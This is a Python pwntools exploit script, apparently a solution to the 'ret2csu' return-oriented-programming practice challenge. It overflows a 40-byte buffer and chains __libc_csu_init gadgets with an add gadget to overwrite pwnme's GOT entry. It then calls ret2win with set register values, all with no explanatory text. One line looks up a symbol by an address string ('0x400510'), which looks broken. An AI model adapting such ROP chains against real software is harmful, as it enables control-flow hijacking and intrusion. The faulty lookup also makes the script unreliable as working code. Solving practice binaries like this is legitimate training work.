from pwn import *
def ret2csu(rdi,rsi,rdx,fun):
	payload=p64(0x000000000040069a)
	payload+=p64(0)+p64(1)+p64(fun)+p64(rdi)+p64(rsi)+p64(rdx)#+p64()
	payload+=p64(0x0000000000400680)
	return payload
r=process('./ret2csu')
binary=ELF('./ret2csu', checksec=False)

ret2win=binary.symbols['0x400510']
pwnme_addrspret_offset=838 						#add    rsp, 0x8; ret
pwnme_got=binary.symbols.got['pwnme']
add=0x00000000004005e8 							#add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret
gdb.attach(r, """break *0x000000000040069a""")
poprdi=0x00000000004006a3 						#pop rdi ; ret
payload="a"*40
#write
payload+=p64(0x000000000040069a)+p64(pwnme_addrspret_offset)+p64(pwnme_got+0x3d)+p64(0)*4+p64(add)
payload+=ret2csu(0xdeadbeefdeadbeef,0xcafebabecafebabe,0xd00df00dd00df00d,pwnme_got)
payload+=p64(poprdi)+p64(0xdeadbeefdeadbeef)+p64(ret2win)
r.recvuntil('> ')
r.sendline(payload)
r.interactive()